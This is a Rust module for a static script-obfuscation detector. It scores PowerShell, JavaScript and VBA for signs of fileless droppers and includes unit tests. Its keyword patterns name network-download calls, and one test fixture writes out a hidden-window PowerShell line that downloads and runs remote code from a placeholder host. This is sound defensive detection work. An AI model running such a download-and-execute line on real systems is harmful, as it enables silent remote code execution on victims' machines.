//! Script obfuscation analyzer for fileless / living-off-the-land payloads.
//!
//! Targets PowerShell, JScript/JavaScript and VBA - the carriers behind most
//! fileless attacks. Rather than execute anything, we score textual signals
//! that obfuscated droppers share: base64 blobs, dynamic invocation
//! (`IEX`/`eval`), char-code reconstruction, and abnormally high token entropy.

use crate::entropy;

/// Coarse script-language guess used to weight signals.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScriptLang {
    PowerShell,
    JavaScript,
    Vba,
    Shell,
    Unknown,
}

/// Obfuscation / malicious-intent signals found in a script.
#[derive(Debug, Clone, Default)]
pub struct ScriptIndicators {
    /// Dynamic code execution (`IEX`, `Invoke-Expression`, `eval`, `Execute`).
    pub dynamic_exec: bool,
    /// Base64 decode usage (`FromBase64String`, `atob`).
    pub base64_decode: bool,
    /// Network download (`WebClient`, `Invoke-WebRequest`, `XMLHTTP`, `curl`).
    pub network: bool,
    /// Char-code reconstruction (`[char]`, `String.fromCharCode`, `Chr(`).
    pub char_codes: bool,
    /// Encoded-command / hidden-window flags (PowerShell `-enc`, `-w hidden`).
    pub encoded_cmd: bool,
    /// Shannon entropy of the script body (bits/byte).
    pub entropy: f64,
}

impl ScriptIndicators {
    /// Analyze raw script bytes (treated case-insensitively where it matters).
    pub fn scan(data: &[u8]) -> ScriptIndicators {
        let lower = data.to_ascii_lowercase();
        ScriptIndicators {
            // Real dynamic-exec calls. NOTE: do NOT match ".execute" - that is
            // SQL cursor.execute() in benign code, not code evaluation.
            dynamic_exec: has(&lower, b"iex")
                || has(&lower, b"invoke-expression")
                || has(&lower, b"eval(")
                || has(&lower, b"exec("),
            base64_decode: has(&lower, b"frombase64string") || has(&lower, b"atob("),
            network: has(&lower, b"webclient")
                || has(&lower, b"invoke-webrequest")
                || has(&lower, b"downloadstring")
                || has(&lower, b"xmlhttp")
                || has(&lower, b"net.webclient"),
            // Char-code string *reconstruction* obfuscation: PowerShell/JS forms,
            // or MANY chr() calls (a single chr() is ordinary in benign Python).
            char_codes: has(&lower, b"[char]")
                || has(&lower, b"fromcharcode")
                || count(&lower, b"chr(") >= 8,
            // PowerShell encoded-command / hidden-window. "-enc " has a trailing
            // boundary so it does not match "-encoding"/"-encrypt" in benign code.
            encoded_cmd: has(&lower, b"-enc ")
                || has(&lower, b"-encodedcommand")
                || has(&lower, b"-w hidden")
                || has(&lower, b"-windowstyle hidden"),
            entropy: entropy::shannon(data),
        }
    }

    /// Number of independent signals that tripped.
    pub fn signal_count(&self) -> u32 {
        [
            self.dynamic_exec,
            self.base64_decode,
            self.network,
            self.char_codes,
            self.encoded_cmd,
        ]
        .iter()
        .filter(|b| **b)
        .count() as u32
    }
}

/// Best-effort language classification from content.
pub fn classify_lang(data: &[u8]) -> ScriptLang {
    let lower = data.to_ascii_lowercase();
    if data.starts_with(b"#!") && (has(&lower, b"/bin/sh") || has(&lower, b"/bin/bash")) {
        ScriptLang::Shell
    } else if has(&lower, b"$")
        && (has(&lower, b"-eq") || has(&lower, b"write-host") || has(&lower, b"param("))
    {
        ScriptLang::PowerShell
    } else if has(&lower, b"function") && (has(&lower, b"var ") || has(&lower, b"=>")) {
        ScriptLang::JavaScript
    } else if has(&lower, b"sub ") || has(&lower, b"dim ") || has(&lower, b"end sub") {
        ScriptLang::Vba
    } else {
        ScriptLang::Unknown
    }
}

fn has(haystack: &[u8], needle: &[u8]) -> bool {
    haystack.len() >= needle.len() && haystack.windows(needle.len()).any(|w| w == needle)
}

/// Count non-overlapping-ish occurrences of `needle` (used to require *many*
/// char-code calls before treating them as obfuscation).
fn count(haystack: &[u8], needle: &[u8]) -> usize {
    if needle.is_empty() || haystack.len() < needle.len() {
        return 0;
    }
    haystack
        .windows(needle.len())
        .filter(|w| *w == needle)
        .count()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_obfuscated_powershell() {
        let ps = b"powershell -w hidden -enc ; IEX (New-Object Net.WebClient).DownloadString('http://x')";
        let ind = ScriptIndicators::scan(ps);
        assert!(ind.dynamic_exec);
        assert!(ind.network);
        assert!(ind.encoded_cmd);
        assert!(ind.signal_count() >= 3);
    }

    #[test]
    fn benign_script_is_quiet() {
        let ind = ScriptIndicators::scan(b"Write-Host 'hello world'");
        assert_eq!(ind.signal_count(), 0);
    }

    #[test]
    fn benign_python_sql_and_chr_is_quiet() {
        // Regression: a real /usr/bin tool (dcrack) tripped on cursor.execute()
        // (SQL), a few chr(), and "-encoding" - none of which are obfuscation.
        let py = b"import sqlite3\ncur.execute('SELECT * FROM jobs')\n\
                   tag = chr(65) + chr(66) + chr(67)\nopts = '--encoding utf-8'\n";
        let ind = ScriptIndicators::scan(py);
        assert!(!ind.dynamic_exec, ".execute is SQL, not code eval");
        assert!(!ind.char_codes, "a few chr() is not char-code obfuscation");
        assert!(!ind.encoded_cmd, "-encoding must not match -enc");
        assert_eq!(ind.signal_count(), 0);
    }

    #[test]
    fn language_classification() {
        assert_eq!(classify_lang(b"#!/bin/bash\necho hi"), ScriptLang::Shell);
    }
}
